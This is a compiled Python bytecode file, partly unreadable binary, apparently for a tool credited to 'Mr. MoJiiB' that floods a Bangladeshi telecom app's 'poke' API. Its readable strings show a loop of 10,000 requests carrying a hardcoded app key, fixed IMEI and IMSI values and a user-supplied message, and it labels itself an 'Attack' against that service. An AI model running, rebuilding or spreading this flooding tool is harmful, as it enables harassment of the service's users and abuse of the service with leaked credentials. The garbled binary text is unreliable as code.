o
    ��b�	  �                   @   s�  d dl Z e �d� d dl Z e �d� ed� d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdZdd� Zeeede  ��Zeeed e ��Ze �d� eed � e�d�Zeed � ee	d � eed e	 d e d � e�d� ee
de�� d � eed � ee
d � d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ eed � d dlZd dlZd dlZd dlmZ d dlmZmZmZmZ d dlZd dlmZ d dlZd dlZd dlZd dlmZ d dlZd dlmZ d dlZd e d! Ze� Z d"e d#< d$e d%< ee d&< e!d'�D ]!Z"ejee d(�Z#e#�� d) d*k�r6eed+ � �qee	d, � �qeee	d- e
 d. e	 d/ ��Z$e �d� d dl Z e �d� dS )0�    N�clearzlolcat banner.py�
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr   �{�G�z�?)�sys�stdout�write�flush�time�sleep)ZpudinaZword� r   �cp.py�	logoprint   s
   
�r   z[>] Enter Api Key: z[>] Enter Your Messege: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : Mr. MoJiiBz	 VERSION 	  : 3.0u   	 ♥♥z	 Mr. MoJiiBr   z	 Your IP Addreds:- Zipz3
==================================================z$  To Stop Attack press CTRL + Z....
)�CaseInsensitiveDictz 
)r
   )�init�Fore�Back�Stylez�https://circle.robi.com.bd/mylife/appapi/appcall.php?op=performAction&app_version=78&nickname=bloodylover&action=poke&msgId=974&imei=355176100129757&imsi=470022500179917&msisd&message=z&retry=false&operator=Robi�gzipz
User-AgentZ(000oc0so48owkw4s0wwo4c00g00804w80gwkw8kgz	x-app-keyz	x-api-keyi'  )�headersZrdesczUnauthorized accessz
[!] Enter Vaild IDu    
[√] Poke Succesfully Submitedz 
 Pressz Enterz To Exit)%�os�system�printZasyncior   Zrequestsr	   ZbiblackZbiredZbigreenZbiyellowZbiblueZbipurpleZbicyanZbiehiter   �str�input�b�c�getZresponser
   ZjsonZrequests.structuresr   Zcoloramar   r   r   r   Zurlr   �range�iZrespZxnr   r   r   r   �<module>   sx    




	 
